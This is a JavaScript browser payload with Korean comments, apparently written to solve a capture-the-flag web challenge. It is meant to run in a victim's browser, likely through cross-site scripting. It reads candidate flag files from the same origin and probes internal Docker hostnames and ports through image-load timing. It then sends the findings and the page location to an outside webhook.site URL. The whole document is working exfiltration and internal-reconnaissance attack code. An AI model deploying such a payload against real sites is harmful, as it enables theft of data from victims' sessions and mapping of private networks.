(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';

    // 1. 도커 네트워크 스캔 (호스트네임 추측)
    // CTF에서 자주 쓰이는 컨테이너 이름들입니다.
    const hosts = ['flag', 'admin', 'db', 'redis', 'internal', 'web', 'bot', 'challenge'];
    const ports = [80, 8000, 8080, 5000];
    
    let networkResults = {};

    // 2. 파일 경로 스캔 (Port 5000)
    // 혹시 정적 파일이나 루트에 플래그 파일이 있는지 확인
    const paths = ['/flag', '/flag.txt', '/app/flag', '/static/flag.txt', '/robots.txt', '/sitemap.xml'];
    let pathResults = {};

    // [함수 A] 호스트 스캔 (Image Blind Scan 사용)
    // fetch는 CORS 때문에 실패할 수 있으니, 이미지를 사용하여 '연결 가능 여부'를 봅니다.
    const checkHost = (host, port) => {
        return new Promise(resolve => {
            const img = new Image();
            const start = Date.now();
            let resolved = false;

            // 1.5초 이상 걸리면 '열려있음(타임아웃)' 또는 '느린 응답'으로 간주
            const timeout = setTimeout(() => {
                if(!resolved) { resolved = true; resolve({host, port, status: 'TIMEOUT (Maybe Open)'}); }
            }, 1500);

            // DNS가 해석되고 연결이 되면(404라도) onerror가 뜹니다.
            // 호스트가 없으면(NXDOMAIN) 브라우저가 즉시 에러를 냅니다(chrome: very fast).
            // 따라서 "시간"이 중요합니다.
            img.onerror = () => {
                if(!resolved) { 
                    resolved = true; clearTimeout(timeout);
                    const time = Date.now() - start;
                    // 호스트 찾음: 보통 DNS lookup + connection이라 아주 빠르진 않음 (>10ms)
                    // 호스트 없음: 즉시 실패 (<5ms)
                    resolve({host, port, status: 'ERROR', time}); 
                }
            };
            
            img.onload = () => { /* 거의 안 일어남 */ };
            img.src = `http://${host}:${port}/favicon.ico?r=${Math.random()}`;
        });
    };

    // [함수 B] 파일 경로 스캔 (Fetch 사용)
    // 같은 출처(Port 5000)이므로 fetch로 내용 읽기 가능
    for (const path of paths) {
        try {
            const res = await fetch(path);
            if (res.status === 200) {
                pathResults[path] = await res.text();
            } else {
                pathResults[path] = `Status ${res.status}`;
            }
        } catch(e) {}
    }

    // 네트워크 스캔 실행
    for (const host of hosts) {
        for (const port of ports) {
            const res = await checkHost(host, port);
            // 20ms 이상 걸린 것만 기록 (너무 빠른 건 호스트 없음일 가능성 큼)
            if (res.status.includes('TIMEOUT') || (res.status === 'ERROR' && res.time > 20)) {
                networkResults[`http://${host}:${port}`] = `${res.status} (${res.time}ms)`;
                
                // 만약 호스트가 살아있다면, 내용 훔치기 시도 (CORS 무시 fetch)
                try {
                    fetch(`http://${host}:${port}/flag`, {mode: 'no-cors'}); 
                    // 이건 성공 여부를 알 수 없지만, 서버 로그에 남기기 위함
                } catch(e) {}
            }
        }
    }

    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            msg: "Docker Network & File Scan",
            network: networkResults,
            files: pathResults,
            location: window.location.href
        })
    });
})();
